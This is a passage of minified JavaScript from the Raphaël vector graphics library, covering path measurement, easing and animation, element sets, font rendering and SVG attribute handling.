a.isPointInsidePath(d,b,c)},cl.getBBox=function(a){if(this.removed)return{};var b=this._;if(a){if(b.dirty||!b.bboxwt)this.realPath=bi[this.type](this),b.bboxwt=bI(this.realPath),b.bboxwt.toString=cq,b.dirty=0;return b.bboxwt}if(b.dirty||b.dirtyT||!b.bbox){if(b.dirty||!this.realPath)b.bboxwt=0,this.realPath=bi[this.type](this);b.bbox=bI(bj(this.realPath,this.matrix)),b.bbox.toString=cq,b.dirty=b.dirtyT=0}return b.bbox},cl.clone=function(){if(this.removed)return null;var a=this.paper[this.type]().attr(this.attr());this.__set__&&this.__set__.push(a);return a},cl.glow=function(a){if(this.type=="text")return null;a=a||{};var b={width:(a.width||10)+(+this.attr("stroke-width")||1),fill:a.fill||!1,opacity:a.opacity||.5,offsetx:a.offsetx||0,offsety:a.offsety||0,color:a.color||"#000"},c=b.width/2,d=this.paper,e=d.set(),f=this.realPath||bi[this.type](this);f=this.matrix?bj(f,this.matrix):f;for(var g=1;g<c+1;g++)e.push(d.path(f).attr({stroke:b.color,fill:b.fill?b.color:"none","stroke-linejoin":"round","stroke-linecap":"round","stroke-width":+(b.width/c*g).toFixed(3),opacity:+(b.opacity/c).toFixed(3)}));return e.insertBefore(this).translate(b.offsetx,b.offsety)};var cr={},cs=function(b,c,d,e,f,g,h,i,j){return j==null?bB(b,c,d,e,f,g,h,i):a.findDotsAtSegment(b,c,d,e,f,g,h,i,bC(b,c,d,e,f,g,h,i,j))},ct=function(b,c){return function(d,e,f){d=bR(d);var g,h,i,j,k="",l={},m,n=0;for(var o=0,p=d.length;o<p;o++){i=d[o];if(i[0]=="M")g=+i[1],h=+i[2];else{j=cs(g,h,i[1],i[2],i[3],i[4],i[5],i[6]);if(n+j>e){if(c&&!l.start){m=cs(g,h,i[1],i[2],i[3],i[4],i[5],i[6],e-n),k+=["C"+m.start.x,m.start.y,m.m.x,m.m.y,m.x,m.y];if(f)return k;l.start=k,k=["M"+m.x,m.y+"C"+m.n.x,m.n.y,m.end.x,m.end.y,i[5],i[6]].join(),n+=j,g=+i[5],h=+i[6];continue}if(!b&&!c){m=cs(g,h,i[1],i[2],i[3],i[4],i[5],i[6],e-n);return{x:m.x,y:m.y,alpha:m.alpha}}}n+=j,g=+i[5],h=+i[6]}k+=i.shift()+i}l.end=k,m=b?n:c?l:a.findDotsAtSegment(g,h,i[0],i[1],i[2],i[3],i[4],i[5],1),m.alpha&&(m={x:m.x,y:m.y,alpha:m.alpha});return m}},cu=ct(1),cv=ct(),cw=ct(0,1);a.getTotalLength=cu,a.getPointAtLength=cv,a.getSubpath=function(a,b,c){if(this.getTotalLength(a)-c<1e-6)return cw(a,b).end;var d=cw(a,c,1);return b?cw(d,b).end:d},cl.getTotalLength=function(){if(this.type=="path"){if(this.node.getTotalLength)return this.node.getTotalLength();return cu(this.attrs.path)}},cl.getPointAtLength=function(a){if(this.type=="path")return cv(this.attrs.path,a)},cl.getSubpath=function(b,c){if(this.type=="path")return a.getSubpath(this.attrs.path,b,c)};var cx=a.easing_formulas={linear:function(a){return a},"<":function(a){return A(a,1.7)},">":function(a){return A(a,.48)},"<>":function(a){var b=.48-a/1.04,c=w.sqrt(.1734+b*b),d=c-b,e=A(z(d),1/3)*(d<0?-1:1),f=-c-b,g=A(z(f),1/3)*(f<0?-1:1),h=e+g+.5;return(1-h)*3*h*h+h*h*h},backIn:function(a){var b=1.70158;return a*a*((b+1)*a-b)},backOut:function(a){a=a-1;var b=1.70158;return a*a*((b+1)*a+b)+1},elastic:function(a){if(a==!!a)return a;return A(2,-10*a)*w.sin((a-.075)*2*B/.3)+1},bounce:function(a){var b=7.5625,c=2.75,d;a<1/c?d=b*a*a:a<2/c?(a-=1.5/c,d=b*a*a+.75):a<2.5/c?(a-=2.25/c,d=b*a*a+.9375):(a-=2.625/c,d=b*a*a+.984375);return d}};cx.easeIn=cx["ease-in"]=cx["<"],cx.easeOut=cx["ease-out"]=cx[">"],cx.easeInOut=cx["ease-in-out"]=cx["<>"],cx["back-in"]=cx.backIn,cx["back-out"]=cx.backOut;var cy=[],cz=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||function(a){setTimeout(a,16)},cA=function(){var b=+(new Date),c=0;for(;c<cy.length;c++){var d=cy[c];if(d.el.removed||d.paused)continue;var e=b-d.start,f=d.ms,h=d.easing,i=d.from,j=d.diff,k=d.to,l=d.t,m=d.el,o={},p,r={},s;d.initstatus?(e=(d.initstatus*d.anim.top-d.prev)/(d.percent-d.prev)*f,d.status=d.initstatus,delete d.initstatus,d.stop&&cy.splice(c--,1)):d.status=(d.prev+(d.percent-d.prev)*(e/f))/d.anim.top;if(e<0)continue;if(e<f){var t=h(e/f);for(var u in i)if(i[g](u)){switch(U[u]){case C:p=+i[u]+t*f*j[u];break;case"colour":p="rgb("+[cB(O(i[u].r+t*f*j[u].r)),cB(O(i[u].g+t*f*j[u].g)),cB(O(i[u].b+t*f*j[u].b))].join(",")+")";break;case"path":p=[];for(var v=0,w=i[u].length;v<w;v++){p[v]=[i[u][v][0]];for(var x=1,y=i[u][v].length;x<y;x++)p[v][x]=+i[u][v][x]+t*f*j[u][v][x];p[v]=p[v].join(q)}p=p.join(q);break;case"transform":if(j[u].real){p=[];for(v=0,w=i[u].length;v<w;v++){p[v]=[i[u][v][0]];for(x=1,y=i[u][v].length;x<y;x++)p[v][x]=i[u][v][x]+t*f*j[u][v][x]}}else{var z=function(a){return+i[u][a]+t*f*j[u][a]};p=[["m",z(0),z(1),z(2),z(3),z(4),z(5)]]}break;case"csv":if(u=="clip-rect"){p=[],v=4;while(v--)p[v]=+i[u][v]+t*f*j[u][v]}break;default:var A=[][n](i[u]);p=[],v=m.paper.customAttributes[u].length;while(v--)p[v]=+A[v]+t*f*j[u][v]}o[u]=p}m.attr(o),function(a,b,c){setTimeout(function(){eve("raphael.anim.frame."+a,b,c)})}(m.id,m,d.anim)}else{(function(b,c,d){setTimeout(function(){eve("raphael.anim.frame."+c.id,c,d),eve("raphael.anim.finish."+c.id,c,d),a.is(b,"function")&&b.call(c)})})(d.callback,m,d.anim),m.attr(k),cy.splice(c--,1);if(d.repeat>1&&!d.next){for(s in k)k[g](s)&&(r[s]=d.totalOrigin[s]);d.el.attr(r),cE(d.anim,d.el,d.anim.percents[0],null,d.totalOrigin,d.repeat-1)}d.next&&!d.stop&&cE(d.anim,d.el,d.next,null,d.totalOrigin,d.repeat)}}a.svg&&m&&m.paper&&m.paper.safari(),cy.length&&cz(cA)},cB=function(a){return a>255?255:a<0?0:a};cl.animateWith=function(b,c,d,e,f,g){var h=this;if(h.removed){g&&g.call(h);return h}var i=d instanceof cD?d:a.animation(d,e,f,g),j,k;cE(i,h,i.percents[0],null,h.attr());for(var l=0,m=cy.length;l<m;l++)if(cy[l].anim==c&&cy[l].el==b){cy[m-1].start=cy[l].start;break}return h},cl.onAnimation=function(a){a?eve.on("raphael.anim.frame."+this.id,a):eve.unbind("raphael.anim.frame."+this.id);return this},cD.prototype.delay=function(a){var b=new cD(this.anim,this.ms);b.times=this.times,b.del=+a||0;return b},cD.prototype.repeat=function(a){var b=new cD(this.anim,this.ms);b.del=this.del,b.times=w.floor(x(a,0))||1;return b},a.animation=function(b,c,d,e){if(b instanceof cD)return b;if(a.is(d,"function")||!d)e=e||d||null,d=null;b=Object(b),c=+c||0;var f={},h,i;for(i in b)b[g](i)&&Q(i)!=i&&Q(i)+"%"!=i&&(h=!0,f[i]=b[i]);if(!h)return new cD(b,c);d&&(f.easing=d),e&&(f.callback=e);return new cD({100:f},c)},cl.animate=function(b,c,d,e){var f=this;if(f.removed){e&&e.call(f);return f}var g=b instanceof cD?b:a.animation(b,c,d,e);cE(g,f,g.percents[0],null,f.attr());return f},cl.setTime=function(a,b){a&&b!=null&&this.status(a,y(b,a.ms)/a.ms);return this},cl.status=function(a,b){var c=[],d=0,e,f;if(b!=null){cE(a,this,-1,y(b,1));return this}e=cy.length;for(;d<e;d++){f=cy[d];if(f.el.id==this.id&&(!a||f.anim==a)){if(a)return f.status;c.push({anim:f.anim,status:f.status})}}if(a)return 0;return c},cl.pause=function(a){for(var b=0;b<cy.length;b++)cy[b].el.id==this.id&&(!a||cy[b].anim==a)&&eve("raphael.anim.pause."+this.id,this,cy[b].anim)!==!1&&(cy[b].paused=!0);return this},cl.resume=function(a){for(var b=0;b<cy.length;b++)if(cy[b].el.id==this.id&&(!a||cy[b].anim==a)){var c=cy[b];eve("raphael.anim.resume."+this.id,this,c.anim)!==!1&&(delete c.paused,this.status(c.anim,c.status))}return this},cl.stop=function(a){for(var b=0;b<cy.length;b++)cy[b].el.id==this.id&&(!a||cy[b].anim==a)&&eve("raphael.anim.stop."+this.id,this,cy[b].anim)!==!1&&cy.splice(b--,1);return this},eve.on("raphael.remove",cF),eve.on("raphael.clear",cF),cl.toString=function(){return"Raphaël’s object"};var cG=function(a){this.items=[],this.length=0,this.type="set";if(a)for(var b=0,c=a.length;b<c;b++)a[b]&&(a[b].constructor==cl.constructor||a[b].constructor==cG)&&(this[this.items.length]=this.items[this.items.length]=a[b],this.length++)},cH=cG.prototype;cH.push=function(){var a,b;for(var c=0,d=arguments.length;c<d;c++)a=arguments[c],a&&(a.constructor==cl.constructor||a.constructor==cG)&&(b=this.items.length,this[b]=this.items[b]=a,this.length++);return this},cH.pop=function(){this.length&&delete this[this.length--];return this.items.pop()},cH.forEach=function(a,b){for(var c=0,d=this.items.length;c<d;c++)if(a.call(b,this.items[c],c)===!1)return this;return this};for(var cI in cl)cl[g](cI)&&(cH[cI]=function(a){return function(){var b=arguments;return this.forEach(function(c){c[a][m](c,b)})}}(cI));cH.attr=function(b,c){if(b&&a.is(b,E)&&a.is(b[0],"object"))for(var d=0,e=b.length;d<e;d++)this.items[d].attr(b[d]);else for(var f=0,g=this.items.length;f<g;f++)this.items[f].attr(b,c);return this},cH.clear=function(){while(this.length)this.pop()},cH.splice=function(a,b,c){a=a<0?x(this.length+a,0):a,b=x(0,y(this.length-a,b));var d=[],e=[],f=[],g;for(g=2;g<arguments.length;g++)f.push(arguments[g]);for(g=0;g<b;g++)e.push(this[a+g]);for(;g<this.length-a;g++)d.push(this[a+g]);var h=f.length;for(g=0;g<h+d.length;g++)this.items[a+g]=this[a+g]=g<h?f[g]:d[g-h];g=this.items.length=this.length-=b-h;while(this[g])delete this[g++];return new cG(e)},cH.exclude=function(a){for(var b=0,c=this.length;b<c;b++)if(this[b]==a){this.splice(b,1);return!0}},cH.animate=function(b,c,d,e){(a.is(d,"function")||!d)&&(e=d||null);var f=this.items.length,g=f,h,i=this,j;if(!f)return this;e&&(j=function(){!--f&&e.call(i)}),d=a.is(d,D)?d:j;var k=a.animation(b,c,d,j);h=this.items[--g].animate(k);while(g--)this.items[g]&&!this.items[g].removed&&this.items[g].animateWith(h,k,k);return this},cH.insertAfter=function(a){var b=this.items.length;while(b--)this.items[b].insertAfter(a);return this},cH.getBBox=function(){var a=[],b=[],c=[],d=[];for(var e=this.items.length;e--;)if(!this.items[e].removed){var f=this.items[e].getBBox();a.push(f.x),b.push(f.y),c.push(f.x+f.width),d.push(f.y+f.height)}a=y[m](0,a),b=y[m](0,b),c=x[m](0,c),d=x[m](0,d);return{x:a,y:b,x2:c,y2:d,width:c-a,height:d-b}},cH.clone=function(a){a=new cG;for(var b=0,c=this.items.length;b<c;b++)a.push(this.items[b].clone());return a},cH.toString=function(){return"Raphaël‘s set"},a.registerFont=function(a){if(!a.face)return a;this.fonts=this.fonts||{};var b={w:a.w,face:{},glyphs:{}},c=a.face["font-family"];for(var d in a.face)a.face[g](d)&&(b.face[d]=a.face[d]);this.fonts[c]?this.fonts[c].push(b):this.fonts[c]=[b];if(!a.svg){b.face["units-per-em"]=R(a.face["units-per-em"],10);for(var e in a.glyphs)if(a.glyphs[g](e)){var f=a.glyphs[e];b.glyphs[e]={w:f.w,k:{},d:f.d&&"M"+f.d.replace(/[mlcxtrv]/g,function(a){return{l:"L",c:"C",x:"z",t:"m",r:"l",v:"c"}[a]||"M"})+"z"};if(f.k)for(var h in f.k)f[g](h)&&(b.glyphs[e].k[h]=f.k[h])}}return a},k.getFont=function(b,c,d,e){e=e||"normal",d=d||"normal",c=+c||{normal:400,bold:700,lighter:300,bolder:800}[c]||400;if(!!a.fonts){var f=a.fonts[b];if(!f){var h=new RegExp("(^|\\s)"+b.replace(/[^\w\d\s+!~.:_-]/g,p)+"(\\s|$)","i");for(var i in a.fonts)if(a.fonts[g](i)&&h.test(i)){f=a.fonts[i];break}}var j;if(f)for(var k=0,l=f.length;k<l;k++){j=f[k];if(j.face["font-weight"]==c&&(j.face["font-style"]==d||!j.face["font-style"])&&j.face["font-stretch"]==e)break}return j}},k.print=function(b,d,e,f,g,h,i){h=h||"middle",i=x(y(i||0,1),-1);var j=r(e)[s](p),k=0,l=0,m=p,n;a.is(f,e)&&(f=this.getFont(f));if(f){n=(g||16)/f.face["units-per-em"];var o=f.face.bbox[s](c),q=+o[0],t=o[3]-o[1],u=0,v=+o[1]+(h=="baseline"?t+ +f.face.descent:t/2);for(var w=0,z=j.length;w<z;w++){if(j[w]=="\n")k=0,B=0,l=0,u+=t;else{var A=l&&f.glyphs[j[w-1]]||{},B=f.glyphs[j[w]];k+=l?(A.w||f.w)+(A.k&&A.k[j[w]]||0)+f.w*i:0,l=1}B&&B.d&&(m+=a.transformPath(B.d,["t",k*n,u*n,"s",n,n,q,v,"t",(b-q)/n,(d-v)/n]))}}return this.path(m).attr({fill:"#000",stroke:"none"})},k.add=function(b){if(a.is(b,"array")){var c=this.set(),e=0,f=b.length,h;for(;e<f;e++)h=b[e]||{},d[g](h.type)&&c.push(this[h.type]().attr(h))}return c},a.format=function(b,c){var d=a.is(c,E)?[0][n](c):arguments;b&&a.is(b,D)&&d.length-1&&(b=b.replace(e,function(a,b){return d[++b]==null?p:d[b]}));return b||p},a.fullfill=function(){var a=/\{([^\}]+)\}/g,b=/(?:(?:^|\.)(.+?)(?=\[|\.|$|\()|\[('|")(.+?)\2\])(\(\))?/g,c=function(a,c,d){var e=d;c.replace(b,function(a,b,c,d,f){b=b||d,e&&(b in e&&(e=e[b]),typeof e=="function"&&f&&(e=e()))}),e=(e==null||e==d?a:e)+"";return e};return function(b,d){return String(b).replace(a,function(a,b){return c(a,b,d)})}}(),a.ninja=function(){i.was?h.win.Raphael=i.is:delete Raphael;return a},a.st=cH,function(b,c,d){function e(){/in/.test(b.readyState)?setTimeout(e,9):a.eve("raphael.DOMload")}b.readyState==null&&b.addEventListener&&(b.addEventListener(c,d=function(){b.removeEventListener(c,d,!1),b.readyState="complete"},!1),b.readyState="loading"),e()}(document,"DOMContentLoaded"),i.was?h.win.Raphael=a:Raphael=a,eve.on("raphael.DOMload",function(){b=!0})}(),window.Raphael.svg&&function(a){var b="hasOwnProperty",c=String,d=parseFloat,e=parseInt,f=Math,g=f.max,h=f.abs,i=f.pow,j=/[, ]+/,k=a.eve,l="",m=" ",n="http://www.w3.org/1999/xlink",o={block:"M5,0 0,2.5 5,5z",classic:"M5,0 0,2.5 5,5 3.5,3 3.5,2z",diamond:"M2.5,0 5,2.5 2.5,5 0,2.5z",open:"M6,1 1,3.5 6,6",oval:"M2.5,0A2.5,2.5,0,0,1,2.5,5 2.5,2.5,0,0,1,2.5,0z"},p={};a.toString=function(){return"Your browser supports SVG.\nYou are running Raphaël "+this.version};var q=function(d,e){if(e){typeof d=="string"&&(d=q(d));for(var f in e)e[b](f)&&(f.substring(0,6)=="xlink:"?d.setAttributeNS(n,f.substring(6),c(e[f])):d.setAttribute(f,c(e[f])))}else d=a._g.doc.createElementNS("http://www.w3.org/2000/svg",d),d.style&&(d.style.webkitTapHighlightColor="rgba(0,0,0,0)");return d},r=function(b,e){var j="linear",k=b.id+e,m=.5,n=.5,o=b.node,p=b.paper,r=o.style,s=a._g.doc.getElementById(k);if(!s){e=c(e).replace(a._radial_gradient,function(a,b,c){j="radial";if(b&&c){m=d(b),n=d(c);var e=(n>.5)*2-1;i(m-.5,2)+i(n-.5,2)>.25&&(n=f.sqrt(.25-i(m-.5,2))*e+.5)&&n!=.5&&(n=n.toFixed(5)-1e-5*e)}return l}),e=e.split(/\s*\-\s*/);if(j=="linear"){var t=e.shift();t=-d(t);if(isNaN(t))return null;var u=[0,0,f.cos(a.rad(t)),f.sin(a.rad(t))],v=1/(g(h(u[2]),h(u[3]))||1);u[2]*=v,u[3]*=v,u[2]<0&&(u[0]=-u[2],u[2]=0),u[3]<0&&(u[1]=-u[3],u[3]=0)}var w=a._parseDots(e);if(!w)return null;k=k.replace(/[\(\)\s,\xb0#]/g,"_"),b.gradient&&k!=b.gradient.id&&(p.defs.removeChild(b.gradient),delete b.gradient);if(!b.gradient){s=q(j+"Gradient",{id:k}),b.gradient=s,q(s,j=="radial"?{fx:m,fy:n}:{x1:u[0],y1:u[1],x2:u[2],y2:u[3],gradientTransform:b.matrix.invert()}),p.defs.appendChild(s);for(var x=0,y=w.length;x<y;x++)s.appendChild(q("stop",{offset:w[x].offset?w[x].offset:x?"100%":"0%","stop-color":w[x].color||"#fff"}))}}q(o,{fill:"url(#"+k+")",opacity:1,"fill-opacity":1}),r.fill=l,r.opacity=1,r.fillOpacity=1;return 1},s=function(a){var b=a.getBBox(1);q(a.pattern,{patternTransform:a.matrix.invert()+" translate("+b.x+","+b.y+")"})},t=function(d,e,f){if(d.type=="path"){var g=c(e).toLowerCase().split("-"),h=d.paper,i=f?"end":"start",j=d.node,k=d.attrs,m=k["stroke-width"],n=g.length,r="classic",s,t,u,v,w,x=3,y=3,z=5;while(n--)switch(g[n]){case"block":case"classic":case"oval":case"diamond":case"open":case"none":r=g[n];break;case"wide":y=5;break;case"narrow":y=2;break;case"long":x=5;break;case"short":x=2}r=="open"?(x+=2,y+=2,z+=2,u=1,v=f?4:1,w={fill:"none",stroke:k.stroke}):(v=u=x/2,w={fill:k.stroke,stroke:"none"}),d._.arrows?f?(d._.arrows.endPath&&p[d._.arrows.endPath]--,d._.arrows.endMarker&&p[d._.arrows.endMarker]--):(d._.arrows.startPath&&p[d._.arrows.startPath]--,d._.arrows.startMarker&&p[d._.arrows.startMarker]--):d._.arrows={};if(r!="none"){var A="raphael-marker-"+r,B="raphael-marker-"+i+r+x+y;a._g.doc.getElementById(A)?p[A]++:(h.defs.appendChild(q(q("path"),{"stroke-linecap":"round",d:o[r],id:A})),p[A]=1);var C=a._g.doc.getElementById(B),D;C?(p[B]++,D=C.getElementsByTagName("use")[0]):(C=q(q("marker"),{id:B,markerHeight:y,markerWidth:x,orient:"auto",refX:v,refY:y/2}),D=q(q("use"),{"xlink:href":"#"+A,transform:(f?"rotate(180 "+x/2+" "+y/2+") ":l)+"scale("+x/z+","+y/z+")","stroke-width":(1/((x/z+y/z)/2)).toFixed(4)}),C.appendChild(D),h.defs.appendChild(C),p[B]=1),q(D,w);var F=u*(r!="diamond"&&r!="oval");f?(s=d._.arrows.startdx*m||0,t=a.getTotalLength(k.path)-F*m):(s=F*m,t=a.getTotalLength(k.path)-(d._.arrows.enddx*m||0)),w={},w["marker-"+i]="url(#"+B+")";if(t||s)w.d=Raphael.getSubpath(k.path,s,t);q(j,w),d._.arrows[i+"Path"]=A,d._.arrows[i+"Marker"]=B,d._.arrows[i+"dx"]=F,d._.arrows[i+"Type"]=r,d._.arrows[i+"String"]=e}else f?(s=d._.arrows.startdx*m||0,t=a.getTotalLength(k.path)-s):(s=0,t=a.getTotalLength(k.path)-(d._.arrows.enddx*m||0)),d._.arrows[i+"Path"]&&q(j,{d:Raphael.getSubpath(k.path,s,t)}),delete d._.arrows[i+"Path"],delete d._.arrows[i+"Marker"],delete d._.arrows[i+"dx"],delete d._.arrows[i+"Type"],delete d._.arrows[i+"String"];for(w in p)if(p[b](w)&&!p[w]){var G=a._g.doc.getElementById(w);G&&G.parentNode.removeChild(G)}}},u={"":[0],none:[0],"-":[3,1],".":[1,1],"-.":[3,1,1,1],"-..":[3,1,1,1,1,1],". ":[1,3],"- ":[4,3],"--":[8,3],"- .":[4,3,1,3],"--.":[8,3,1,3],"--..":[8,3,1,3,1,3]},v=function(a,b,d){b=u[c(b).toLowerCase()];if(b){var e=a.attrs["stroke-width"]||"1",f={round:e,square:e,butt:0}[a.attrs["stroke-linecap"]||d["stroke-linecap"]]||0,g=[],h=b.length;while(h--)g[h]=b[h]*e+(h%2?1:-1)*f;q(a.node,{"stroke-dasharray":g.join(",")})}},w=function(d,f){var i=d.node,k=d.attrs,m=i.style.visibility;i.style.visibility="hidden";for(var o in f)if(f[b](o)){if(!a._availableAttrs[b](o))continue;var p=f[o];k[o]=p;switch(o){case"blur":d.blur(p);break;case"href":case"title":case"target":var u=i.parentNode;if(u.tagName.toLowerCase()!="a"){var w=q("a");u.insertBefore(w,i),w.appendChild(i),u=w}o=="target"?u.setAttributeNS(n,"show",p=="blank"?"new":p):u.setAttributeNS(n,o,p);break;case"cursor":i.style.cursor=p;break;case"transform":d.transform(p);break;case"arrow-start":t(d,p);break;case"arrow-end":t(d,p,1);break;case"clip-rect":var x=c(p).split(j);if(x.length==4){d.clip&&d.clip.parentNode.parentNode.removeChild(d.clip.parentNode);var z=q("clipPath"),A=q("rect");z.id=a.createUUID(),q(A,{x:x[0],y:x[1],width:x[2],height:x[3]}),z.appendChild(A),d.paper.defs.appendChild(z),q(i,{"clip-path":"url(#"+z.id+")"}),d.clip=A}if(!p){var B=i.getAttribute("clip-path");if(B){var C=a._g.doc.getElementById(B.replace(/(^url\(#|\)$)/g,l));C&&C.parentNode.removeChild(C),q(i,{"clip-path":l}),delete d.clip}}break;case"path":d.type=="path"&&(q(i,{d:p?k.path=a._pathToAbsolute(p):"M0,0"}),d._.dirty=1,d._.arrows&&("startString"in d._.arrows&&t(d,d._.arrows.startString),"endString"in d._.arrows&&t(d,d._.arrows.endString,1)));break;case"width":i.setAttribute(o,p),d._.dirty=1;if(k.fx)o="x",p=k.x;else break;case"x":k.fx&&(p=-k.x-(k.width||0));case"rx":if(o=="rx"&&d.type=="rect")break;case"cx":i.setAttribute(o,p),d.pattern&&s(d),d._.dirty=1;break;case"height":i.setAttribute(o,p),d._.dirty=1;if(k.fy)o="y",p=k.y;else break;case"y":k.fy&&(p=-k.y-(k.height||0));case"ry":if(o=="ry"&&d.type=="rect")break;case"cy":i.setAttribute(o,p),d.pattern&&s(d),d._.dirty=1;break;case"r":d.type=="rect"?q(i,{rx:p,ry:p}):i.setAttribute(o,p),d._.dirty=1;break;case"src":d.type=="image"&&i.setAttributeNS(n,"href",p);break;case"stroke-width":if(d._.sx!=1||d._.sy!=1)p/=g(h(d._.sx),h(d._.sy))||1;d.paper._vbSize&&(p*=d.paper._vbSize),i.setAttribute(o,p),k["stroke-dasharray"]&&v(d,k["stroke-dasharray"],f),d._.arrows&&("startString"in d._.arrows&&t(d,d._.arrows.startString),"endString"in d._.arrows&&t(d,d._.arrows.endString,1));break;case"stroke-dasharray":v(d,p,f);break;case"fill":var D=c(p).match(a._ISURL);if(D){z=q("pattern");var F=q("image");z.id=a.createUUID(),q(z,{x:0,y:0,patternUnits:"userSpaceOnUse",height:1,width:1}),q(F,{x:0,y:0,"xlink:href":D[1]}),z.appendChild(F),function(b){a._preload(D[1],function(){var a=this.offsetWidth,c=this.offsetHeight;q(b,{width:a,height:c}),q(F,{width:a,height:c}),d.paper.safari()})}(z),d.paper.defs.appendChild(z),q(i,{fill:"url(#"+z.id+")"}),d.pattern=z,d.pattern&&s(d);break}var G=a.getRGB(p);if(!G.error)delete f.gradient,delete k.gradient,!a.is(k.opacity,"undefined")&&a.is(f.opacity,"undefined")&&q(i,{opacity:k.opacity}),!a.is(k["fill-opacity"],"undefined")&&a.is(f["fill-opacity"],"undefined")&&q(i,{"fill-opacity":k["fill-opacity"]});else if((d.type=="circle"||d.type=="ellipse"||c(p).charAt()!="r")&&r(d,p)){if("opacity"in k||"fill-opacity"in k){var H=a._g.doc.getElementById(i.getAttribute("fill").replace(/^url\(#|\)$/g,l));if(H){var I=H.getElementsByTagName("stop");q(I[I.length-1],{"stop-opacity":("opacity"in k?k.opacity:1)*("fill-opacity"in k?k["fill-opacity"]:1)})}}k.gradient=p,k.fill="none";break}G[b]("opacity")&&q(i,{"fill-opacity":G.opacity>1?G.opacity/100:G.opacity});case"stroke":G=a.getRGB(p),i.setAttribute(o,G.hex),o=="stroke"&&G[b]("opacity")&&q(i,{"stroke-opacity":G.opacity>1?G.opacity/100:G.opacity}),o=="stroke"&&d._.arrows&&("startString"in d._.arrows&&t(d,d._.arrows.startString),"endString"in d._.arrows&&t(d,d._.arrows.endString,1));break;case"gradient":(d.type=="circle"||d.type=="ellipse"||c(p).charAt()!="r")&&r(d,p);break;case"opacity":k.gradient&&!k[b]("stroke-opacity")&&q(i,{"stroke-opacity":p>1?p/100:p});case"fill-opacity":if(k.gradient){H=a._g.doc.getElementById(i.getAttribute("fill").replace(/^url\(#|\)$/g,l)),H&&(I=H.getElementsByTagName("stop"),q(I[I.length-1],{"stop-opacity":p}));break};default:o=="font-size"&&(p=e(p,10)+"px");var J=o.replace(/(\-.)/g,function(a){return a.substring(1).toUpperCase()});i.style[J]=p,d._.dirty=1,i.setAttribute(o,p)}}y(d,f),i.style.visibility=m},x=1.2,y=function(d,f){if(d.type=="text"&&!!(f[b]("text")||f[b]("font")||f[b]("font-size")||f[b]("x")||f[b]("y"))){var g=d.attrs,h=d.node,i=h.firstChild?e(a._g.doc.defaultView.getComputedStyle(h.firstChild,l).getPropertyValue("font-size"),10):10;if(f[b]("text")){g.text=f.text;while(h.firstChild)h.removeChild(h.firstChild);var j=c(f.text).split("\n"),k=[],m;for(var n=0,o=j.length;n<o;n++)m=q("tspan"),n&&q(m,{dy:i*x,x:g.x}),m.appendChild(a._g.doc.createTextNode(j[n])),h.appendChild(m),k[n]=m}else{k=h.getElementsByTagName("tspan");for(n=0,o=k.length;n<o;n++)n?q(k[n],{dy:i*x,x:g.x}):q(k[0],{dy:0})}q(h,{x:g.x,y:g.y}),d._.dirty=1;var p=d._getBBox(),r=g.y-(p.y+p.height/2);r&&a.is(r,"finite")&&q(k[0],{dy:r})}},z=function(b,c){var d=0,e=0;this[0]=this.node=b,b.raphael=!0,this.id=a._oid++,b.raphaelid=this.id,this.matrix=a.matrix(),this.realPath=null,this.paper=c,this.attrs=this.attrs||{},this._={transform:[],sx:1,sy:1,deg:0,dx:0,dy:0,dirty:1},!c.bottom&&(c.bottom=this),this.prev=c.top,c.top&&(c.top.next=this),c.top=this,this.next=null},A=a.el;z.prototype=A,A.constructor=z,a._engine.path=function(a,b){var c=q("path");b.canvas&&b.canvas.appendChild(c);var d=new z(c,b);d.type="path",w(d,{fill:"none",stroke:"#000",path:a});return d},A.rotate=function(a,b,e){if(this.removed)return this;a=c(a).split(j),a.length-1&&(b=d(a[1]),e=d(a[2])),a=d(a[0]),e==null&&(b=e);if(b==null||e==null){var f=this.getBBox(1);b=f.x+f.width/2,e=f.y+f.height/2}this.transform(this._.transform.concat([["r",a,b,e]]));return this},A.scale=function(a,b,e,f){if(this.removed)return this;a=c(a).split(j),a.length-1&&(b=d(a[1]),e=d(a[2]),f=d(a[3])),a=d(a[0]),b==null&&(b=a),f==null&&(e=f);if(e==null||f==null)var g=this.getBBox(1);e=e==null?g.x+g.width/2:e,f=f==null?g.y+g.height/2:f,this.transform(this._.transform.concat([["s",a,b,e,f]]));return this},A.translate=function(a,b){if(this.removed)return this;a=c(a).split(j),a.length-1&&(b=d(a[1])),a=d(a[0])||0,b=+b||0,this.transform(this._.transform.concat([["t",a,b]]));return this},A.transform=function(c){var d=this._;if(c==null)return d.transform;a._extractTransform(this,c),this.clip&&q(this.clip,{transform:this.matrix.invert()}),this.pattern&&s(this),this.node&&q(this.node,{transform:this.matrix});if(d.sx!=1||d.sy!=1){var e=this.attrs[b]("stroke-width")?this.attrs["stroke-width"]:1;this.attr({"stroke-width":e})}return this},A.hide=function(){!this.removed&&this.paper.safari(this.node.style.display="none");return this},A.show=function(){!this.removed&&this.paper.safari(this.node.style.display="");return this},A.remove=function(){if(!this.removed&&!!this.node.parentNode){var b=this.paper;b.__set__&&b.__set__.exclude(this),k.unbind("raphael.*.*."+this.id),this.gradient&&b.defs.removeChild(this.gradient),a._tear(this,b),this.node.parentNode.tagName.toLowerCase()=="a"?this.node.parentNode.parentNode.removeChild(this.node.parentNode):this.node.parentNode.removeChild(this.node);for(var c in this)this[c]=typeof this[c]=="function"?a._removedFactory(c):null;this.removed=!0}},A._getBBox=function(){if(this.node.style.display=="none"){this.show();var a=!0}var b={};try{b=this.node.getBBox()}catch(c){}finally{b=b||{}}a&&this.hide();return b},A.attr=function(c,d){if(this.removed)return this;if(c==null){var e={};for(var f in this.attrs)this.attrs[b](f)&&(e[f]=this.attrs[f]);e.gradient&&e.fill=="none"&&(e.fill=e.gradient)&&delete e.gradient,e.transform=this._.transform;return e}if(d==null&&a.is(c,"string")){if(c=="fill"&&this.attrs.fill=="none"&&this.attrs.gradient)return this.attrs.gradient;if(c=="transform")return this._.transform;var g=c.split(j),h={};for(var i=0,l=g.length;i<l;i++)c=g[i],c in this.attrs?h[c]=this.attrs[c]:a.is(this.paper.customAttributes[c],"function")?h[c]=this.paper.customAttributes[c].def:h[c]=a._availableAttrs[c];return l-1?h:h[g[0]]}if(d==null&&a.is(c,"array")){h={};for(i=0,l=c.length;i<l;i++)h[c[i]]=this.attr(c[i]);return h}if(d!=null){var m={};m[c]=d}else c!=null&&a.is(c,"object")&&(m=c);for(var n in m)k("raphael.attr."+n+"."+this.id,this,m[n]);for(n in 